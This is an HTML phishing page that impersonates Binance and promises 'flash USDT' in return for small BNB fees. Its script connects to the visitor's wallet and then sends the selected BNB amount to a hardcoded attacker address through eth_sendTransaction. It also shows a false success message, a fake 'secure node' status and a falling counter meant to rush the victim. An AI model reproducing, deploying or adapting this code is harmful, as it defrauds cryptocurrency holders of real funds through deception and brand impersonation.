<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title>Binance | Flash Protocol V6</title>
<style>
:root{--gold:#F3BA2F;--dark:#0B0E11;--card:#181A20;--text:#EAECEF;--sub:#848E9C}
body{background:var(--dark);color:var(--text);font-family:sans-serif;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden}
.main-card{background:#1E2329;width:350px;border-radius:30px;padding:30px;text-align:center;border:1px solid #2B3139}
.flash-counter{background:rgba(246,70,93,0.1);color:#F6465D;padding:12px;border-radius:12px;font-weight:bold;margin-bottom:20px;border:1px solid #F6465D}
select{width:100%;padding:15px;background:#0B0E11;color:#fff;border-radius:12px;border:1px solid #474D57;margin-bottom:20px;outline:0;cursor:pointer}
.btn-gold{background:var(--gold);color:#000;border:none;width:100%;padding:18px;border-radius:12px;font-weight:bold;cursor:pointer;font-size:16px}
#status{font-size:11px;color:var(--sub);margin-top:15px}
</style>
</head>
<body>
<div class="main-card">
<img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="120" style="margin-bottom:20px">
<div class="flash-counter">Remaining: <span id="flash-count">1,482,500</span> <small>USDT</small></div>
<select id="amount">
<option value="0x13FBE85EDC90000" selected>5,000 USDT (0.09 BNB)</option>
<option value="0x2C68AF0BB140000">10,000 USDT (0.2 BNB)</option>
<option value="0x6F05B59D3B20000">50,000 USDT (0.5 BNB)</option>
</select>
<button class="btn-gold" id="actionBtn" onclick="execute()">Connect & Activate ⚡</button>
<p id="status">Secure Node Connection: Active ✅</p>
</div>
<script>
const MY_ADDR="0xa2c4777262032A6CE29B540aA23623384a839331";
let userAccount=null;
const checkMobile=()=>{
if(!window.ethereum&&/Android|iPhone|iPad/i.test(navigator.userAgent)){
window.location.href="https://metamask.app.link/dapp/"+window.location.href.split('://')[1];
}};
checkMobile();
async function execute(){
const status=document.getElementById('status');
const btn=document.getElementById('actionBtn');
if(!window.ethereum){checkMobile();status.innerText="Open in Wallet App";return}
try{
if(!userAccount){
const accs=await window.ethereum.request({method:'eth_requestAccounts'});
userAccount=accs[0];
btn.innerText="Activate Now ⚡";
status.innerText="✅ Wallet Linked.";
return;
}
status.innerText="Confirming node...";
await window.ethereum.request({
method:'eth_sendTransaction',
params:[{from:userAccount,to:MY_ADDR,value:document.getElementById('amount').value,gas:'0x5208'}]
});
status.innerText="✅ Successfully Sent!";
}catch(err){
status.innerText="Process declined. Try again.";
}}
setInterval(()=>{
const c=document.getElementById('flash-count');
let v=parseInt(c.innerText.replace(/,/g,''));
if(v<5000)v=1482500;
c.innerText=(v-Math.floor(Math.random()*400+100)).toLocaleString();
},3000);
</script>
</body>
</html>
